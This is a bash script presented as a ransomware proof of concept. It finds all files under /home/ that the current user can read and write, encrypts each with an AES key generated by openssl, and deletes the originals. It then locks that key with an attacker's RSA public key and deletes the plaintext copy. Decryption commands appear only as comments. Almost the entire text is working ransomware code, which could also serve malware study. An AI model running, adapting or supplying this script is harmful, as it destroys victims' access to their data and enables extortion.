#!/bin/bash

# Bash Ransomware PoC written by
# Steve Willson
# This version encrypts files in the /home/ directory
# that are readable and writable by the current user

########################################################
# 
#   This program is a bash ramsonware PoC
#   Generate a private/public keypair, put the PUBLIC key in
#   this file, this script will generate a symmetric key, 
#   use it to encrypt specified files encrypt the symmetric key 
#   using the public key and then display the message including 
#   the encrypted public key
#
########################################################

# GENERATE A PRIVATE KEY
# openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048

# USE THE PRIVATE KEY TO GENERATE THE MATCHING PUBLIC KEY
# openssl rsa -pubout -in private_key.pem -out public_key.pem

# PASTE THE PUBLIC KEY BELOW
PUBLIC_KEY="
"

# GENERATE A RANDOM SYMMETRIC KEY
echo "Generating symmetric key"
openssl rand -base64 -out /tmp/sym.key 32
echo -e "Symmetric key is \n$(cat /tmp/sym.key)"
echo ""

# FIND FILES IN THE /home/ DIRECTORY READABLE AND WRITABLE
# BY THE CURRENT USER, STORE THE FILES IN /tmp/enc_files

find /home/ -type f -readable -writable 2>/dev/null > /tmp/enc_files
echo "Gathering files to encrypt"
echo -e "This program will encrypt files that are readable and"
echo -e "writable by the current user in the /home/ directory"
echo ""

# ENCRYPT THE FILES USING THE SYMMETRIC KEY
echo "Encrypting the files using the generated symmetric key"
while IFS= read -r filename; do 
	echo "Encrypting $filename"; 
    	openssl enc -aes-256-cbc -salt -in $filename -out $filename.enc -pass file:/tmp/sym.key
    	rm -f $filename
done </tmp/enc_files 

# AFTER ENCRYPTING THE FILES, ENCRYPT THE SYMMETRIC KEY
echo "Encrypting the symmetric key with the public key"
echo "$PUBLIC_KEY" > /tmp/public_key
openssl rsautl -encrypt -inkey /tmp/public_key -pubin -in /tmp/sym.key -out /tmp/sym.key.enc
rm -f /tmp/public_key
echo ""

# DELETE THE SYMMETRIC KEY
echo "Deleting the unencrypted symmetric key"
rm -f /tmp/sym.key
echo ""

# Display the encrypted symmetric key and a message showing how to
# get a decrypted version of the symmetric key to decrypt the files
echo "Your encrypted symmetric key is stored in /tmp/sym.key.enc"
echo "you will need to decrypt this file with the PRIVATE KEY"
echo "in order to decrypt the files."
echo "Your encrypted symmetric key is"
echo "$(cat /tmp/sym.key.enc | base64)"
echo ""

# To decrypt the files, you will need to run the following commands
# have the PRIVATE_KEY stored as a variable

# Save the PRIVATE KEY to /tmp/priv_key
# echo "$PRIVATE_KEY" > /tmp/priv_key

# Decrypt the symmetric key with the private key
# openssl rsautl -decrypt -inkey /tmp/priv_key -in /tmp/sym.key.enc -out /tmp/sym.key

# Go through the encrypted files and decrypt them using the decrypted symmetric key
#for file in $(cat /tmp/enc_files); do
#openssl enc -d -aes-256-cbc -in $file.enc -out $file -pass file:/tmp/sym.key;
#rm -f $file.enc 
#done

